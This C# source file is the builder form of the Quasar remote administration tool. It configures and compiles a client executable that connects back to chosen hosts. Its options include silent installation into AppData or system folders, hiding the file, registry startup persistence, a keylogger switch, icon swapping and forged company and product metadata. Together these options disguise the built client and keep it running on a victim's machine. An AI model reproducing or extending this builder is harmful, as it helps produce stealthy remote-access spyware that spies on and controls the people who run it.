using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Windows.Forms;
using xServer.Core.Build;
using xServer.Core.Data;
using xServer.Core.Helper;

namespace xServer.Forms
{
    public partial class FrmBuilder : Form
    {
        private bool _profileLoaded;
        private bool _changed;
        private BindingList<Host> _hosts = new BindingList<Host>();

        public FrmBuilder()
        {
            InitializeComponent();
        }

        private void LoadProfile(string profilename)
        {
            var profile = new BuilderProfile(profilename);

            foreach (var host in HostHelper.GetHostsList(profile.Hosts))
                _hosts.Add(host);
            lstHosts.DataSource = new BindingSource(_hosts, null);

            txtTag.Text = profile.Tag;
            txtPassword.Text = profile.Password;
            txtDelay.Text = profile.Delay.ToString();
            txtMutex.Text = profile.Mutex;
            chkInstall.Checked = profile.InstallClient;
            txtInstallname.Text = profile.InstallName;
            GetInstallPath(profile.InstallPath).Checked = true;
            txtInstallsub.Text = profile.InstallSub;
            chkHide.Checked = profile.HideFile;
            chkStartup.Checked = profile.AddStartup;
            txtRegistryKeyName.Text = profile.RegistryName;
            chkChangeIcon.Checked = profile.ChangeIcon;
            txtIconPath.Text = profile.IconPath;
            chkChangeAsmInfo.Checked = profile.ChangeAsmInfo;
            chkKeylogger.Checked = profile.Keylogger;
            txtProductName.Text = profile.ProductName;
            txtDescription.Text = profile.Description;
            txtCompanyName.Text = profile.CompanyName;
            txtCopyright.Text = profile.Copyright;
            txtTrademarks.Text = profile.Trademarks;
            txtOriginalFilename.Text = profile.OriginalFilename;
            txtProductVersion.Text = profile.ProductVersion;
            txtFileVersion.Text = profile.FileVersion;

            _profileLoaded = true;
        }

        private void SaveProfile(string profilename)
        {
            var profile = new BuilderProfile(profilename);

            profile.Tag = txtTag.Text;
            profile.Hosts = HostHelper.GetRawHosts(_hosts);
            profile.Password = txtPassword.Text;
            profile.Delay = int.Parse(txtDelay.Text);
            profile.Mutex = txtMutex.Text;
            profile.InstallClient = chkInstall.Checked;
            profile.InstallName = txtInstallname.Text;
            profile.InstallPath = GetInstallPath();
            profile.InstallSub = txtInstallsub.Text;
            profile.HideFile = chkHide.Checked;
            profile.AddStartup = chkStartup.Checked;
            profile.RegistryName = txtRegistryKeyName.Text;
            profile.ChangeIcon = chkChangeIcon.Checked;
            profile.IconPath = txtIconPath.Text;
            profile.ChangeAsmInfo = chkChangeAsmInfo.Checked;
            profile.Keylogger = chkKeylogger.Checked;
            profile.ProductName = txtProductName.Text;
            profile.Description = txtDescription.Text;
            profile.CompanyName = txtCompanyName.Text;
            profile.Copyright = txtCopyright.Text;
            profile.Trademarks = txtTrademarks.Text;
            profile.OriginalFilename = txtOriginalFilename.Text;
            profile.ProductVersion = txtProductVersion.Text;
            profile.FileVersion = txtFileVersion.Text;
        }

        private void FrmBuilder_Load(object sender, EventArgs e)
        {
            LoadProfile("Default");

            txtPort.Text = Settings.ListenPort.ToString();

            UpdateInstallationControlStates();
            UpdateStartupControlStates();
            UpdateAssemblyControlStates();
            UpdateIconControlStates();
        }

        private void FrmBuilder_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (_changed &&
                MessageBox.Show("Do you want to save your current settings?", "Changes detected",
                    MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
            {
                SaveProfile("Default");
            }
        }

        private void btnAddHost_Click(object sender, EventArgs e)
        {
            if (txtHost.Text.Length < 1 || txtPort.Text.Length < 1) return;

            HasChanged();

            var host = txtHost.Text;
            ushort port;
            if (!ushort.TryParse(txtPort.Text, out port))
            {
                MessageBox.Show("Please enter a valid port.", "Builder",
                    MessageBoxButtons.OK, MessageBoxIcon.Information);
                return;
            }

            _hosts.Add(new Host {Hostname = host, Port = port});
            txtHost.Text = "";
            txtPort.Text = "";
        }

        #region "Context Menu"
        private void removeHostToolStripMenuItem_Click(object sender, EventArgs e)
        {
            HasChanged();

            List<string> selectedHosts = (from object arr in lstHosts.SelectedItems select arr.ToString()).ToList();

            foreach (var item in selectedHosts)
            {
                foreach (var host in _hosts)
                {
                    if (item == host.ToString())
                    {
                        _hosts.Remove(host);
                        break;
                    }
                }
            }
        }

        private void clearToolStripMenuItem_Click(object sender, EventArgs e)
        {
            HasChanged();

            _hosts.Clear();
        }
        #endregion

        #region "Misc"
        private void chkShowPass_CheckedChanged(object sender, EventArgs e)
        {
            txtPassword.PasswordChar = (chkShowPass.Checked) ? '\0' : '•';
        }

        private void txtPort_KeyPress(object sender, KeyPressEventArgs e)
        {
            e.Handled = (!char.IsControl(e.KeyChar) && !char.IsDigit(e.KeyChar));
        }

        private void txtDelay_KeyPress(object sender, KeyPressEventArgs e)
        {
            e.Handled = (!char.IsControl(e.KeyChar) && !char.IsDigit(e.KeyChar));
        }

        private void txtInstallname_KeyPress(object sender, KeyPressEventArgs e)
        {
            e.Handled = ((e.KeyChar == '\\' || FileHelper.CheckPathForIllegalChars(e.KeyChar.ToString())) &&
                         !char.IsControl(e.KeyChar));
        }

        private void txtInstallsub_KeyPress(object sender, KeyPressEventArgs e)
        {
            e.Handled = ((e.KeyChar == '\\' || FileHelper.CheckPathForIllegalChars(e.KeyChar.ToString())) &&
                         !char.IsControl(e.KeyChar));
        }

        private void btnMutex_Click(object sender, EventArgs e)
        {
            HasChanged();

            txtMutex.Text = FormatHelper.GenerateMutex();
        }

        private void chkInstall_CheckedChanged(object sender, EventArgs e)
        {
            HasChanged();

            UpdateInstallationControlStates();
        }

        private void chkStartup_CheckedChanged(object sender, EventArgs e)
        {
            HasChanged();

            UpdateStartupControlStates();
        }

        private void chkChangeAsmInfo_CheckedChanged(object sender, EventArgs e)
        {
            HasChanged();

            UpdateAssemblyControlStates();
        }

        private void btnBrowseIcon_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                ofd.Title = "Choose Icon";
                ofd.Filter = "Icons *.ico|*.ico";
                ofd.Multiselect = false;
                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    txtIconPath.Text = ofd.FileName;
                    iconPreview.Image = Bitmap.FromHicon(new Icon(ofd.FileName, new Size(64, 64)).Handle);
                }
            }
        }

        private void chkChangeIcon_CheckedChanged(object sender, EventArgs e)
        {
            HasChanged();

            UpdateIconControlStates();
        }
        #endregion

        private bool CheckForEmptyInput()
        {
            return (!string.IsNullOrWhiteSpace(txtTag.Text) && !string.IsNullOrWhiteSpace(txtMutex.Text) && // General Settings
                 _hosts.Count > 0 && !string.IsNullOrWhiteSpace(txtPassword.Text) && !string.IsNullOrWhiteSpace(txtDelay.Text) && // Connection
                 (!chkInstall.Checked || (chkInstall.Checked && !string.IsNullOrWhiteSpace(txtInstallname.Text))) && // Installation
                 (!chkStartup.Checked || (chkStartup.Checked && !string.IsNullOrWhiteSpace(txtRegistryKeyName.Text)))); // Installation
        }

        private BuildOptions ValidateInput()
        {
            BuildOptions options = new BuildOptions();
            if (!CheckForEmptyInput())
            {
                MessageBox.Show("Please fill out all required fields!", "Build failed", MessageBoxButtons.OK,
                    MessageBoxIcon.Information);
                return options;
            }

            options.Tag = txtTag.Text;
            options.Mutex = txtMutex.Text;
            options.RawHosts = HostHelper.GetRawHosts(_hosts);
            options.Password = txtPassword.Text;
            options.Delay = int.Parse(txtDelay.Text);
            options.IconPath = txtIconPath.Text;
            options.Version = Application.ProductVersion;
            options.InstallPath = GetInstallPath();
            options.InstallSub = txtInstallsub.Text;
            options.InstallName = txtInstallname.Text + ".exe";
            options.StartupName = txtRegistryKeyName.Text;
            options.Install = chkInstall.Checked;
            options.Startup = chkStartup.Checked;
            options.HideFile = chkHide.Checked;
            options.Keylogger = chkKeylogger.Checked;

            if (options.Password.Length < 3)
            {
                MessageBox.Show("Please enter a secure password with more than 3 characters.",
                    "Build failed", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return options;
            }

            if (!File.Exists("client.bin"))
            {
                MessageBox.Show("Could not locate \"client.bin\" file. It should be in the same directory as Quasar.",
                    "Build failed", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return options;
            }

            if (options.RawHosts.Length < 2)
            {
                MessageBox.Show("Please enter a valid host to connect to.", "Build failed", MessageBoxButtons.OK,
                    MessageBoxIcon.Error);
                return options;
            }

            if (chkChangeIcon.Checked)
            {
                if (string.IsNullOrWhiteSpace(options.IconPath) || !File.Exists(options.IconPath))
                {
                    MessageBox.Show("Please choose a valid icon path.", "Build failed", MessageBoxButtons.OK,
                        MessageBoxIcon.Error);
                    return options;
                }
            }
            else
                options.IconPath = string.Empty;

            if (chkChangeAsmInfo.Checked)
            {
                if (!FormatHelper.IsValidVersionNumber(txtProductVersion.Text))
                {
                    MessageBox.Show("Please enter a valid product version number!\nExample: 1.2.3.4", "Build failed",
                        MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return options;
                }

                if (!FormatHelper.IsValidVersionNumber(txtFileVersion.Text))
                {
                    MessageBox.Show("Please enter a valid file version number!\nExample: 1.2.3.4", "Build failed",
                        MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return options;
                }

                options.AssemblyInformation = new string[8];
                options.AssemblyInformation[0] = txtProductName.Text;
                options.AssemblyInformation[1] = txtDescription.Text;
                options.AssemblyInformation[2] = txtCompanyName.Text;
                options.AssemblyInformation[3] = txtCopyright.Text;
                options.AssemblyInformation[4] = txtTrademarks.Text;
                options.AssemblyInformation[5] = txtOriginalFilename.Text;
                options.AssemblyInformation[6] = txtProductVersion.Text;
                options.AssemblyInformation[7] = txtFileVersion.Text;
            }

            using (SaveFileDialog sfd = new SaveFileDialog())
            {
                sfd.Title = "Save Client as";
                sfd.Filter = "Executables *.exe|*.exe";
                sfd.RestoreDirectory = true;
                sfd.FileName = "Client-built.exe";
                if (sfd.ShowDialog() != DialogResult.OK)
                {
                    return options;
                }
                options.OutputPath = sfd.FileName;
            }

            if (string.IsNullOrEmpty(options.OutputPath))
            {
                MessageBox.Show("Please choose a valid output path.", "Build failed", MessageBoxButtons.OK,
                    MessageBoxIcon.Error);
                return options;
            }

            options.ValidationSuccess = true;
            return options;
        }

        private void btnBuild_Click(object sender, EventArgs e)
        {
            BuildOptions options = ValidateInput();
            if (!options.ValidationSuccess)
                return;

            try
            {
                ClientBuilder.Build(options);

                MessageBox.Show("Successfully built client!\nSaved to: " + options.OutputPath, "Build Success", MessageBoxButtons.OK,
                    MessageBoxIcon.Information);
            }
            catch (Exception ex)
            {
                MessageBox.Show(
                    string.Format("An error occurred!\n\nError Message: {0}\nStack Trace:\n{1}", ex.Message,
                        ex.StackTrace), "Build failed", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void RefreshPreviewPath()
        {
            string path = string.Empty;
            if (rbAppdata.Checked)
                path =
                    Path.Combine(
                        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                            txtInstallsub.Text), txtInstallname.Text);
            else if (rbProgramFiles.Checked)
                path =
                    Path.Combine(
                        Path.Combine(
                            Environment.GetFolderPath(PlatformHelper.Architecture == 64
                                ? Environment.SpecialFolder.ProgramFilesX86
                                : Environment.SpecialFolder.ProgramFiles), txtInstallsub.Text), txtInstallname.Text);
            else if (rbSystem.Checked)
                path =
                    Path.Combine(
                        Path.Combine(
                            Environment.GetFolderPath(PlatformHelper.Architecture == 64
                                ? Environment.SpecialFolder.SystemX86
                                : Environment.SpecialFolder.System), txtInstallsub.Text), txtInstallname.Text);

            this.Invoke((MethodInvoker)delegate { txtPreviewPath.Text = path + ".exe"; });
        }

        private short GetInstallPath()
        {
            if (rbAppdata.Checked) return 1;
            if (rbProgramFiles.Checked) return 2;
            if (rbSystem.Checked) return 3;
            throw new ArgumentException("InstallPath");
        }

        private RadioButton GetInstallPath(short installPath)
        {
            switch (installPath)
            {
                case 1:
                    return rbAppdata;
                case 2:
                    return rbProgramFiles;
                case 3:
                    return rbSystem;
                default:
                    throw new ArgumentException("InstallPath");
            }
        }

        private void UpdateAssemblyControlStates()
        {
            txtProductName.Enabled = chkChangeAsmInfo.Checked;
            txtDescription.Enabled = chkChangeAsmInfo.Checked;
            txtCompanyName.Enabled = chkChangeAsmInfo.Checked;
            txtCopyright.Enabled = chkChangeAsmInfo.Checked;
            txtTrademarks.Enabled = chkChangeAsmInfo.Checked;
            txtOriginalFilename.Enabled = chkChangeAsmInfo.Checked;
            txtFileVersion.Enabled = chkChangeAsmInfo.Checked;
            txtProductVersion.Enabled = chkChangeAsmInfo.Checked;
        }

        private void UpdateIconControlStates()
        {
            txtIconPath.Enabled = chkChangeIcon.Checked;
            btnBrowseIcon.Enabled = chkChangeIcon.Checked;
        }

        private void UpdateStartupControlStates()
        {
            txtRegistryKeyName.Enabled = chkStartup.Checked;
        }

        private void UpdateInstallationControlStates()
        {
            txtInstallname.Enabled = chkInstall.Checked;
            rbAppdata.Enabled = chkInstall.Checked;
            rbProgramFiles.Enabled = chkInstall.Checked;
            rbSystem.Enabled = chkInstall.Checked;
            txtInstallsub.Enabled = chkInstall.Checked;
            chkHide.Enabled = chkInstall.Checked;
        }

        private void HasChanged()
        {
            if (!_changed && _profileLoaded)
                _changed = true;
        }

        /// <summary>
        /// Handles a basic change in setting.
        /// </summary>
        private void HasChangedSetting(object sender, EventArgs e)
        {
            HasChanged();
        }

        /// <summary>
        /// Handles a basic change in setting, also refreshing the example file path.
        /// </summary>
        private void HasChangedSettingAndFilePath(object sender, EventArgs e)
        {
            HasChanged();

            RefreshPreviewPath();
        }
    }
}